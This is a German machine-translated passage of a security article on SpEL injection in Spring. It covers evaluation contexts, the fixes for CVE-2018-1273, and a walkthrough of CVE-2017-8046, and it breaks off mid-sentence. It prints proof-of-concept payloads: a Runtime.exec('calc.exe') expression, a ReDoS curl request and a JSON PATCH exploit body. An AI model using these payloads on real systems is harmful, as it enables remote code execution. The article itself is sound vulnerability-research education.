<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🗿 🎿 🦊 Spel-Injektion 👨🏽‍💼 ⌚️ 🈴</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Intro 


 Während wir an verschiedenen Diensten arbeiten und diese erforschen, können wir zunehmend den Frühlingsrahmen erfüllen. Der logische Schritt...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Spel-Injektion</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/433034/"><img src="https://habrastorage.org/webt/me/ul/p3/meulp3hfrqubkhj4pxdhmslxeca.jpeg"><br><h1 id="intro">  Intro </h1><br><p>  Während wir an verschiedenen Diensten arbeiten und diese erforschen, können wir zunehmend den Frühlingsrahmen erfüllen.  Der logische Schritt besteht darin, sich mit seiner Struktur und möglichen Schwachstellen vertraut zu machen. </p><br><p>  Die interessantesten für jeden Pentester sind Schwachstellen, die zur Codeausführung führen. </p><br><p>  Eine Möglichkeit, RCE im Frühjahr zu erhalten, besteht darin, SpEL-Ausdrücke einzufügen. </p><br><p>  In diesem Artikel werden wir versuchen zu verstehen, was SpEL ist, wo es zu finden ist, welche Verwendungsmerkmale es gibt und wie solche Injektionen zu finden sind. </p><a name="habracut"></a><br><h1 id="what">  Was? </h1><br><p>  <strong>SpEL</strong> ist eine Ausdruckssprache, die für das Spring Framework erstellt wurde und die Abfrage und Diagrammverwaltung von Objekten zur Laufzeit unterstützt. <br>  Es ist auch wichtig zu beachten, dass SpEL als API erstellt wurde, mit der Sie es in andere Anwendungen und Frameworks integrieren können. </p><br><h1 id="gde-mozhno-vstretit">  Wo kann ich mich treffen? </h1><br><p>  Es ist logisch, dass im <strong>Spring Framework</strong> SpEL ständig verwendet wird.  Ein gutes Beispiel ist Spring Security, bei dem Rechte mithilfe von SpEL-Ausdrücken zugewiesen werden: </p><br><pre><code class="java hljs"><span class="hljs-meta"><span class="hljs-meta">@PreAuthorize</span></span>(<span class="hljs-string"><span class="hljs-string">"hasPermission(#contact, 'admin')"</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">deletePermission</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Contact contact, Sid recipient, Permission permission)</span></span></span></span>;</code> </pre> <br><p><img src="https://habrastorage.org/webt/2g/rq/gp/2grqgp1bk2lc_ajrxtbl4rcsrq4.png"></p><br><p>  Apache Camel verwendet die SpEL-API.  Unten finden Sie Beispiele aus der Dokumentation. <br>  Buchstabenbildung mit SpEL-Ausdrücken: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">from</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:foo"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span>#{request.headers['foo'] == 'bar'}<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">spel</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">to</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">uri</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"direct:bar"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">filter</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">route</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Oder Sie können eine Regel aus einer externen Datei verwenden, um beispielsweise einen Header anzugeben: </p><br><pre> <code class="javascript hljs">.setHeader(<span class="hljs-string"><span class="hljs-string">"myHeader"</span></span>).spel(<span class="hljs-string"><span class="hljs-string">"resource:classpath:myspel.txt"</span></span>)</code> </pre> <br><p>  Hier sind einige Beispiele auf GitHub: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://github.com/jpatokal/openflights</a> </p><br><p><img src="https://habrastorage.org/webt/se/wd/ge/sewdgepwblvm0cslrn30d5glbem.png"></p><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://github.com/hbandi/LEP</a> </p><br><p><img src="https://habrastorage.org/webt/xm/nr/h2/xmnrh2rhtdc_eqlfpgqqmukaemu.png"></p><br><h1 id="osnovy-spring-framework-i-spel">  Spring Framework und SpEL Basics </h1><br><p>  Um dem Leser das Verständnis der SpEL-Injektionen zu erleichtern, müssen Sie Spring und SpEL ein wenig kennenlernen. </p><br><p>  Ein Schlüsselelement des Spring Framework ist der Spring Container.  Ein Container erstellt Objekte, bindet sie zusammen, konfiguriert und verwaltet sie von der Erstellung bis zur Zerstörung. </p><br><p>  Zur Steuerung der Komponenten, aus denen die Anwendung besteht, verwendet Spring Container <br>  Abhängigkeitsinjektion.  In diesem Fall werden Objekte mithilfe externer Entitäten konfiguriert, die als Spring Beans bezeichnet werden - umgangssprachlich als "Beans" bezeichnet. </p><br><p>  Spring Container ruft die Konfigurationsmetadaten aus der Bean ab, die zum Abrufen der folgenden Informationen erforderlich sind: Anweisungen dazu, welche Objekte instanziiert werden sollen und wie sie über Metadaten konfiguriert werden. </p><br><p>  Metadaten können auf drei Arten abgerufen werden: </p><br><ul><li>  XML </li><li>  Java-Anmerkungen </li><li>  Java-Code </li></ul><br><p>  Ein weiterer wichtiger Punkt für uns ist der Anwendungskontext. </p><br><p>  <strong>ApplicationContext</strong> ist die Hauptschnittstelle in einer Spring-Anwendung, die Informationen zur Anwendungskonfiguration bereitstellt.  Es ist zur Laufzeit schreibgeschützt, kann jedoch bei Bedarf neu geladen und von der Anwendung unterstützt werden.  Die Anzahl der Klassen, die die ApplicationContext-Schnittstelle implementieren, ist für verschiedene Konfigurationsparameter und Anwendungstypen verfügbar.  In der Tat ist es die Spring-Anwendung selbst.  Der Kontext bietet auch die Möglichkeit, auf verschiedene Ereignisse in der Anwendung zu reagieren und den Lebenszyklus der Beans zu steuern. </p><br><p><img src="https://habrastorage.org/webt/gz/pg/td/gzpgtdz46xowwzhkoa4vsld7utq.png"></p><br><p>  Lassen Sie uns nun direkt auf die Methoden zum Definieren einer Bean und zum Verwenden von SpEL-Ausdrücken eingehen. </p><br><p>  <strong>Bean.xml</strong> </p><br><p>  Ein Beispiel für eine typische Verwendung ist die Integration von SpEL in die Erstellung von XML- oder kommentierten Definitionen von Bean-Komponenten: </p><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">id</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">“exmple</span></span></span><span class="hljs-tag">" </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">class</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"org.spring.samples.NumberGuess"</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"randomNumber"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ T(java.lang.Math).random() * 100.0 }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"#{ systemProperties['user.region'] }"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">property</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">name</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"defaultLocale2"</span></span></span><span class="hljs-tag"> </span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">value</span></span></span><span class="hljs-tag">=</span><span class="hljs-string"><span class="hljs-tag"><span class="hljs-string">"${user.region}"</span></span></span><span class="hljs-tag">/&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">bean</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre> <br><p>  Hier ist ein Teil des Codes in der Bean.xml-Datei für nur eine der Beans.  Es lohnt sich, auf die ID des Fachs zu achten, auf das zugegriffen werden kann, und auf die Eigenschaften.  Weil  Als Teil dieses Artikels erwägen wir die Verwendung von SpEL. Im Beispiel werden dann mehrere Optionen zum Schreiben solcher Ausdrücke angegeben. </p><br><p>  Um Spring anzuzeigen, dass SpEL-Ausdrücke als Nächstes kommen, wird das Zeichen # verwendet und der Ausdruck selbst in geschweiften Klammern angegeben: <code>#{SpEL_expression}</code> .  Auf Eigenschaften kann mit dem Zeichen $ verwiesen werden, wobei der Eigenschaftsname in geschweiften Klammern angegeben wird: <code>${someProperty}</code> .  Eigenschaftsplatzhalter können keine SpEL-Ausdrücke enthalten, aber Ausdrücke können Eigenschaftsreferenzen enthalten: </p><br><pre> <code class="json hljs"><span class="hljs-string"><span class="hljs-string">"#{${someProperty}"</span></span></code> </pre> <br><p>  So können Sie jede benötigte Java-Klasse aufrufen oder beispielsweise auf Umgebungsvariablen zugreifen, die zur Ermittlung des Benutzernamens oder der Version des Systems hilfreich sein können. </p><br><p>  Der Vorteil dieser Methode zum Angeben von Beans besteht darin, dass sie geändert werden können, ohne dass die gesamte Anwendung neu kompiliert werden muss, wodurch sich das Verhalten der Anwendung ändert. </p><br><p>  Über die Anwendung selbst können Sie über die ApplicationContext-Schnittstelle auf diese Bean zugreifen, wie unten gezeigt: </p><br><pre> <code class="java hljs">ApplicationContext ctx = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ClassPathXmlApplicationContext(“Bean.xml”); MyExpression example = ctx.getBean(“example<span class="hljs-string"><span class="hljs-string">", MyExpression.class); "</span></span> + <span class="hljs-string"><span class="hljs-string">"System.out.println(“Number : "</span></span> + example.getValue()); System.out.println(“Locale : <span class="hljs-string"><span class="hljs-string">" + example.getDefaultLocale()); System.out.println(“Locale : "</span></span> + example.getDefaultLocale2());</code> </pre><br><p>  Das heißt,  Innerhalb der Anwendung erhalten wir einfach die Werte der bin-Parameter, die SpEL-Ausdrücke enthalten.  Nachdem Spring einen solchen Wert erhalten hat, führt er den Ausdruck aus und gibt das Endergebnis zurück.  Vergessen Sie auch nicht, dass dieser Code ohne die entsprechenden Getter nicht funktioniert, aber ihre Beschreibung geht über den Rahmen des Artikels hinaus. </p><br><p>  Eine andere Möglichkeit, Beans anzugeben, ist die AnnotationBase-Annotationsmethode. Parameterwerte werden für einige Klassen in der Annotation festgelegt.  In diesem Fall ist die Verwendung von Variablen nicht möglich. </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">FieldValueTestBean</span></span></span><span class="hljs-class"> @</span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Value</span></span></span><span class="hljs-class">("#</span></span>{ systemProperties[<span class="hljs-string"><span class="hljs-string">'user.region'</span></span>] }<span class="hljs-string"><span class="hljs-string">") private String defaultLocale; public void setDefaultLocale(String defaultLocale) { this.defaultLocale = defaultLocale; } public String getDefaultLocale() { return this.defaultLocale; } }</span></span></code> </pre> <br><p>  Um Variablen verwenden zu können, müssen wir beim Erstellen von SpEL-Ausdrücken die ExpressionParser-Schnittstelle verwenden.  Anschließend wird im Anwendungscode eine Klasse angezeigt, ähnlich dem folgenden Beispiel: </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">parseExpressionInterface</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(Person personObj,String property)</span></span></span><span class="hljs-function"> </span></span>{ ExpressionParser parser = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); Expression exp = parser.parseExpression(property+<span class="hljs-string"><span class="hljs-string">" == 'Input'"</span></span>); StandardEvaluationContext testContext = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext(personObj); <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> result = exp.getValue(testContext, Boolean.class);</code> </pre> <br><p>  ExpressionParser konvertiert einen Zeichenfolgenausdruck in ein Expression-Objekt.  Somit kann der Wert des analysierten Ausdrucks im Rahmen des EvaluationContext erhalten werden.  Dieser EvaluationContext ist das einzige Objekt, für das alle Eigenschaften und Variablen in der EL-Zeichenfolge verfügbar sind. </p><br><p>  Es ist erwähnenswert, eine weitere wichtige Tatsache.  Bei dieser Methode zur Verwendung von SpEL muss der Zeichenfolgenausdruck nur # enthalten, wenn er zusätzlich zum Ausdruck selbst Zeichenfolgenliterale enthält. </p><br><p>  Von alledem lohnt es sich, sich an zwei Dinge zu erinnern: <br>  1) Wenn es möglich ist, nach Anwendungscode zu suchen, müssen Sie nach solchen Schlüsselwörtern suchen: SpelExpressionParser, EvaluationContext und parseExpression. <br>  2) Für Spring <code>#{SpEL}</code> , <code>${someProperty}</code> und <code>T(javaclass)</code> wichtige Zeiger <br>  Wenn Sie mehr über Spring und SpEL erfahren möchten, empfehlen wir Ihnen, die Dokumentation zu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">docs.spring.io</a> zu <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">beachten</a> . </p><br><h1 id="chto-voobsche-mozhet-spel">  Was kann SpEL tun? </h1><br><p>  Laut Dokumentation unterstützt SpEL die folgenden Funktionen: </p><br><ul><li>  Wörtliche Ausdrücke </li><li>  Boolesche und relationale Operatoren </li><li>  Reguläre Ausdrücke </li><li>  Klassenausdrücke </li><li>  Zugriff auf Eigenschaften, Arrays, Listen, Karten </li><li>  Methodenaufruf </li><li>  Vergleichsoperatoren </li><li>  Zuordnung </li><li>  Konstruktoren aufrufen </li><li>  Bean Referenzen </li><li>  Array-Konstruktion </li><li>  Inline-Listen </li><li>  Inline-Karten </li><li>  Ternärer Operator </li><li>  Variablen </li><li>  Benutzerdefinierte Funktionen </li><li>  Sammlungsprojektion </li><li>  Sammlungsauswahl </li><li>  Vorlagenausdrücke </li></ul><br><p>  Wie wir sehen können, ist die SpEL-Funktionalität sehr umfangreich, und dies kann die Sicherheit des Projekts beeinträchtigen, wenn Benutzereingaben in ExpressionParser eingehen.  Daher empfiehlt Spring selbst, anstelle eines voll funktionsfähigen StandardEcalutionContext einen abgespeckten SimpleEvaluationContext zu verwenden. </p><br><p>  Kurz gesagt, SimpleEvaluationContext ist für uns nicht wichtig und kann nicht auf Java-Klassen zugreifen und auf andere Beans verweisen. </p><br><p>  Eine vollständige Beschreibung der Funktionen finden Sie am besten auf der Dokumentationswebsite: <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">StandardEvaluationContext</a> <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">SimpleEvaluationContext</a> </p><br><p>  Einige Korrekturen basieren sogar auf dem Unterschied in der Funktionalität von SpEL, das in verschiedenen Kontexten ausgeführt wird. Wir werden jedoch etwas später darauf eingehen. </p><br><p>  Um alles wirklich klar zu machen, geben wir ein Beispiel.  Wir haben eine eindeutig böswillige Zeile, die einen SpEL-Ausdruck enthält: </p><br><pre> <code class="java hljs">String inj = <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec('calc.exe')"</span></span>;</code> </pre> <br><p>  Und es gibt zwei Kontexte: </p><br><pre> <code class="java hljs">StandardEvaluationContext std_c = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> StandardEvaluationContext();</code> </pre> <br><p>  und </p><br><pre> <code class="java hljs">EvaluationContext simple_c = SimpleEvaluationContext.forReadOnlyDataBinding ().build();</code> </pre> <br><p>  Ausdruck exp = parser.parseExpression (inj); <br> <code>java exp.getValue(std_c);</code>  - <strong>Der Rechner wird gestartet</strong> <br> <code>java exp.getValue(simple_c);</code>  - <strong>Wir erhalten eine Fehlermeldung</strong> </p><br><p>  Ein ebenso interessanter Punkt ist, dass wir mit der Verarbeitung des Ausdrucks beginnen können, ohne einen Kontext anzugeben: <code>exp.getValue();</code> <br>  In diesem Fall wird der Ausdruck im Standardkontext ausgeführt und der bösartige Code wird ausgeführt.  Wenn Sie ein Programmierer sind und Spring verwenden, vergessen Sie daher niemals, den Kontext festzulegen, in dem der Ausdruck ausgeführt werden soll. </p><br><p>  Wir haben etwas früher gesagt, dass einige Korrekturen auf den Unterschieden zwischen den SpEL-Funktionen innerhalb von Kontexten beruhen.  Betrachten Sie ein Beispiel für eine solche Korrektur. </p><br><p>  <strong>CVE 2018-1273 Spring Data Commons</strong> <br>  Diese Sicherheitsanfälligkeit wurde in der Methode setPropertyValue gefunden und basierte auf zwei Problemen: <br>  1) Unzureichende Bereinigung der Werte der Variablen, die in ExpressionParser fallen. <br>  2) Ausführung des Ausdrucks im Rahmen des Standardkontexts. </p><br><p>  Hier ist ein Screenshot des anfälligen Teils des Codes: </p><br><p><img src="https://habrastorage.org/webt/rb/84/_7/rb84_76_bpq3ywrf-icytp5hvs8.png"></p><br><p>  Weil  Der Eigenschaftsname erforderte keine komplexe Verarbeitung innerhalb des SpEL-Frameworks. Die logische Lösung bestand darin, den Kontext zu ersetzen, was zu folgendem Code führte: </p><br><p><img src="https://habrastorage.org/webt/xw/re/ue/xwreueydsgforfjf365mwdrpcuc.png"></p><br><p>  Die Screenshots zeigen die Teile des Codes, die den Kontext festlegen, und den Ausdruck, der ausgeführt wird.  Die Ausführung des Ausdrucks erfolgt jedoch an anderer Stelle: </p><br><pre> <code class="java hljs">expression.setValue(context, value);</code> </pre> <br><p>  Hier wird angezeigt, dass wir einen SpEL-Ausdruck für den Wert im angegebenen Kontext ausführen. <br>  Die Verwendung von SimpleEvaluationContext hat zum Schutz vor der Implementierung der Java-Klasse in parseExpression beigetragen. Anstatt jetzt Code im Serverprotokoll auszuführen, wird ein Fehler angezeigt: </p><br><pre> <code class="java hljs">Type cannot be found <span class="hljs-string"><span class="hljs-string">'java.lang.Runtime'</span></span></code> </pre> <br><p>  Dies löste jedoch nicht das Problem mit dem Mangel an ausreichenden sanitären Einrichtungen und behielt die Fähigkeit bei, einen Redos-Angriff durchzuführen: </p><br><pre> <code class="bash hljs">curl -X POST http://localhost:8080/account -d <span class="hljs-string"><span class="hljs-string">"name['aaaaaaaaaaaaaaaaaaaaaaaa!'%20matches%20'%5E(a%2B)%2B%24']=test"</span></span></code> </pre> <br><p>  Daher beinhaltete der nächste Fix bereits die Bereinigung des Parameternamens. </p><br><h1 id="ot-teorii-k-praktike">  Von der Theorie zur Praxis! </h1><br><p>  Schauen wir uns nun verschiedene Möglichkeiten an, um mithilfe der White-Box-Methode nach SpEL-Injektionen zu suchen. </p><br><h2 id="step-by-step-cve-2017-8046">  Schritt für Schritt CVE-2017-8046 </h2><br><p>  Zuerst müssen Sie einen Ort für die Verarbeitung von SpEL-Ausdrücken finden.  Dazu können Sie einfach unsere Empfehlung verwenden und Stichwörter im Code finden.  Erinnern Sie sich an diese Wörter: SpelExpressionParser, EvaluationContext und parseExpression. </p><br><p>  Eine andere Möglichkeit besteht darin, verschiedene Plugins zu verwenden, um Fehler im Code zu finden.  Bisher war findsecbugs-cli das einzige Plugin, das auf eine mögliche SpEL-Injektion hinweist. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://github.com/find-sec-bugs</a> </p><br><p>  Also haben wir den Ort gefunden, an dem wir uns für den Code interessieren.  Angenommen, wir verwenden findsecbugs-cli: </p><br><p><img src="https://habrastorage.org/webt/wg/_w/s5/wg_ws5vbnh1z6vds1-gxjc3zhk0.png"></p><br><p>  Im Anwendungscode sehen wir Folgendes: </p><br><pre> <code class="java hljs"><span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">PathToSpEL</span></span></span><span class="hljs-class"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> SpelExpressionParser SPEL_EXPRESSION_PARSER = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> SpelExpressionParser(); <span class="hljs-keyword"><span class="hljs-keyword">static</span></span> <span class="hljs-keyword"><span class="hljs-keyword">final</span></span> List&lt;String&gt; APPEND_CHARACTERS = Arrays.asList(<span class="hljs-string"><span class="hljs-string">"-"</span></span>); <span class="hljs-comment"><span class="hljs-comment">/** * Converts a patch path to an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression}. * * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@param</span></span></span><span class="hljs-comment"> path the patch path to convert. * </span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@return</span></span></span><span class="hljs-comment"> an {</span><span class="hljs-doctag"><span class="hljs-comment"><span class="hljs-doctag">@link</span></span></span><span class="hljs-comment"> Expression} */</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">static</span></span></span><span class="hljs-function"> Expression </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">pathToExpression</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> SPEL_EXPRESSION_PARSER.parseExpression(pathToSpEL(path)); }</code> </pre> <br><p>  Der nächste Schritt besteht darin, herauszufinden, wo die Pfadvariable in den Ausdrucksparser gelangt.  Eine der bequemsten und kostenlossten Möglichkeiten wäre die Verwendung der IntelijIdea IDE-Funktion - Datenfluss analysieren: </p><br><p><img src="https://habrastorage.org/webt/gd/ud/ag/gdudag-ykwbmvin_70mowuh838u.png"></p><br><p>  Durch Abwickeln der Kette, zum Beispiel zum Ersetzen und Studieren der angegebenen Methoden und Klassen, erhalten wir Folgendes: </p><br><p>  Die ReplaceOperation-Methode übernimmt den Wert der Pfadvariablen. </p><br><pre> <code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">ReplaceOperation</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(String path, Object value)</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">super</span></span>(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>, path, value); }</code> </pre> <br><p>  Um die Ersetzungsmethode aufzurufen, müssen Sie die Variable "op" mit dem Wert "replace" an JSON übergeben. </p><br><pre> <code class="java hljs">JsonNode opNode = elements.next(); String opType = opNode.get(<span class="hljs-string"><span class="hljs-string">"op"</span></span>).textValue(); <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (opType.equals(<span class="hljs-string"><span class="hljs-string">"replace"</span></span>)) { ops.add(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> ReplaceOperation(path, value));</code> </pre> <br><p>  Ebenso finden wir alle Stellen, an denen der Benutzer den von ihm benötigten Wert an die Pfadvariable übergeben kann.  Und dann sieht eine der Ausnutzungsoptionen für die Sicherheitsanfälligkeit folgendermaßen aus: <br>  Anforderungsmethode: PATCH <br>  Text anfordern: </p><br><pre> <code class="json hljs">[{ <span class="hljs-attr"><span class="hljs-attr">"op"</span></span> : <span class="hljs-string"><span class="hljs-string">"add"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"path"</span></span> : <span class="hljs-string"><span class="hljs-string">"T(java.lang.Runtime).getRuntime().exec(\"calc.exe\").x"</span></span>, <span class="hljs-attr"><span class="hljs-attr">"value"</span></span> : <span class="hljs-string"><span class="hljs-string">"pwned"</span></span> }]</code> </pre> <br><h2 id="ispolzovanie-lgtm-ql">  Verwenden von LGTM QL </h2><br><p>  Die Verwendung von LGTM QL (für die Zwecke dieses Artikels reduzieren wir es einfach auf QL) ist eine weitere interessante Möglichkeit, nach Schwachstellen zu suchen. <br>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">https://lgtm.com</a> </p><br><p>  Es sollte sofort seinen Mangel festlegen.  Sie können kostenlos nur Projekte analysieren, die sich in offenen Repositorys auf GitHub befinden, weil  Um ein Bild des Projekts aufzunehmen, lädt LGTM das Projekt auf seinen Server hoch und kompiliert es dort.  Wenn Sie dies jedoch nicht stört, eröffnet Ihnen das LGTM QL 